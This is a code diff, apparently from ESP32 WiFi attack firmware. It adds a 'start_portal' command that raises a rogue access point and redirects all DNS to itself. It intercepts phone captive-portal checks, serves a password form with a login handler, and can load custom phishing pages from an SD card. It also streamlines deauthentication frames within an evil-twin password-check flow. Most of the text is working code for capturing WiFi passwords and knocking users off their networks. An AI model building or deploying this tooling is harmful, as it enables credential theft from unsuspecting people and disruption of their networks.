+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "DHCP server started - clients will get IPs in 172.0.0.x range");
+    
+    // Wait a bit for AP to fully start
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    
+    // Configure HTTP server
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.server_port = 80;
+    config.max_open_sockets = 7;
+    
+    // Start HTTP server
+    esp_err_t http_ret = httpd_start(&portal_server, &config);
+    if (http_ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
+    
+    // Register URI handlers
+    // Root path handler - most devices try this first
+    httpd_uri_t root_uri = {
+        .uri = "/",
+        .method = HTTP_GET,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_uri);
+    
+    // Root path handler for POST requests
+    httpd_uri_t root_post_uri = {
+        .uri = "/",
+        .method = HTTP_POST,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_post_uri);
+    
+    // Portal page handler
+    httpd_uri_t portal_uri = {
+        .uri = "/portal",
+        .method = HTTP_GET,
+        .handler = portal_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &portal_uri);
+    
+    // Login handler
+    httpd_uri_t login_uri = {
+        .uri = "/login",
+        .method = HTTP_POST,
+        .handler = login_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &login_uri);
+    
+    // Android captive portal detection
+    httpd_uri_t android_captive_uri = {
+        .uri = "/generate_204",
+        .method = HTTP_GET,
+        .handler = android_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &android_captive_uri);
+    
+    // iOS captive portal detection
+    httpd_uri_t ios_captive_uri = {
+        .uri = "/hotspot-detect.html",
+        .method = HTTP_GET,
+        .handler = ios_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &ios_captive_uri);
+    
+    // Samsung captive portal detection
+    httpd_uri_t samsung_captive_uri = {
+        .uri = "/ncsi.txt",
+        .method = HTTP_GET,
+        .handler = captive_detection_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
+    
+    // Catch-all handler for other requests
+    httpd_uri_t captive_uri = {
+        .uri = "/*",
+        .method = HTTP_GET,
+        .handler = captive_portal_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint
+    httpd_uri_t captive_api_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_GET,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint for POST/OPTIONS
+    httpd_uri_t captive_api_post_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_POST,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
+    
+    // Register RFC 8908 Captive Portal API endpoint for OPTIONS
+    httpd_uri_t captive_api_options_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_OPTIONS,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
+    
+    // Set portal as active (must be before starting DNS task)
+    portal_active = true;
+    MY_LOG_INFO(TAG, "Portal marked as active");
+    
+    // Start DNS server task
+    BaseType_t task_ret = xTaskCreate(
+        dns_server_task,
+        "dns_server",
+        4096,
+        NULL,
+        5,
+        &dns_server_task_handle
+    );
+    
+    if (task_ret != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create DNS server task");
+        portal_active = false;
+        httpd_stop(portal_server);
+        portal_server = NULL;
+        esp_wifi_stop();
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "DNS server task started");
+    
+    MY_LOG_INFO(TAG, "Captive portal started successfully!");
+    MY_LOG_INFO(TAG, "AP Name: Portal");
+    MY_LOG_INFO(TAG, "AP IP: 172.0.0.1");
+    MY_LOG_INFO(TAG, "Connect to 'Portal' WiFi network to access the portal");
+    MY_LOG_INFO(TAG, "DNS server running on port 53 - all queries redirect to 172.0.0.1");
+    MY_LOG_INFO(TAG, "HTTP server running on port 80");
+    
+    return 0;
+}
+
 // --- Command registration in esp_console ---
 static void register_commands(void)
 {
@@ -2045,6 +3289,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));
 
+    const esp_console_cmd_t portal_cmd = {
+        .command = "start_portal",
+        .help = "Starts captive portal with password form",
+        .hint = NULL,
+        .func = &cmd_start_portal,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
+
     const esp_console_cmd_t stop_cmd = {
         .command = "stop",
         .help = "Stop all running operations",
@@ -2062,6 +3315,24 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));
+
+    const esp_console_cmd_t list_sd_cmd = {
+        .command = "list_sd",
+        .help = "Lists HTML files on SD card",
+        .hint = NULL,
+        .func = &cmd_list_sd,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&list_sd_cmd));
+
+    const esp_console_cmd_t select_html_cmd = {
+        .command = "select_html",
+        .help = "Load custom HTML from SD card: select_html <index>",
+        .hint = NULL,
+        .func = &cmd_select_html,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&select_html_cmd));
 }
 
 void app_main(void) {
@@ -2100,8 +3371,7 @@ void app_main(void) {
 
     ESP_ERROR_CHECK(nvs_flash_init());
 
-    ESP_ERROR_CHECK(wifi_init_ap_sta());
-    ESP_ERROR_CHECK(espnow_init()); 
+    ESP_ERROR_CHECK(wifi_init_ap_sta()); 
 
     wifi_country_t wifi_country = {
         .cc = "PH",
@@ -2129,6 +3399,9 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  sae_overflow");
     MY_LOG_INFO(TAG,"  start_blackout");
     MY_LOG_INFO(TAG,"  start_wardrive");
+    MY_LOG_INFO(TAG,"  start_portal");
+    MY_LOG_INFO(TAG,"  list_sd");
+    MY_LOG_INFO(TAG,"  select_html <index>");
     MY_LOG_INFO(TAG,"  start_sniffer");
     MY_LOG_INFO(TAG,"  show_sniffer_results");
     MY_LOG_INFO(TAG,"  show_probes");
@@ -2157,22 +3430,7 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         return;
     }
 
-    if (!onlyDeauth) {
-        //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
-        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-        //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
-        
-        // Wait in smaller chunks to allow UART processing
-        for (int wait = 0; wait < 300; wait += 50) {
-            vTaskDelay(pdMS_TO_TICKS(50));
-            if (operation_stop_requested) {
-                return; // Exit early if stop requested
-            }
-        }
-        //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
-    }
-
-    //then, proceed with deauth frames on channels of the APs:
+    //proceed with deauth frames on channels of the APs:
     // Use target_bssids[] directly to avoid index confusion after periodic re-scan
     for (int i = 0; i < target_bssid_count; ++i) {
         if (applicationState == EVIL_TWIN_PASS_CHECK ) {
@@ -3098,6 +4356,11 @@ static esp_err_t init_gps_uart(void) {
 static esp_err_t init_sd_card(void) {
     esp_err_t ret;
     
+    // Check if SD card is already mounted
+    if (sd_card_mounted) {
+        return ESP_OK;
+    }
+    
     // Options for mounting the filesystem (optimized for low memory)
     esp_vfs_fat_sdmmc_mount_config_t mount_config = {
         .format_if_mount_failed = false,  // Don't format automatically to save memory
@@ -3120,7 +4383,7 @@ static esp_err_t init_sd_card(void) {
     };
     
     ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);  // DMA required for SD card
-    if (ret != ESP_OK) {
+    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
         MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
         return ret;
     }
@@ -3159,6 +4422,9 @@ static esp_err_t init_sd_card(void) {
     } else {
         MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
     }
+    
+    // Mark SD card as successfully mounted
+    sd_card_mounted = true;
     
     return ESP_OK;
 }
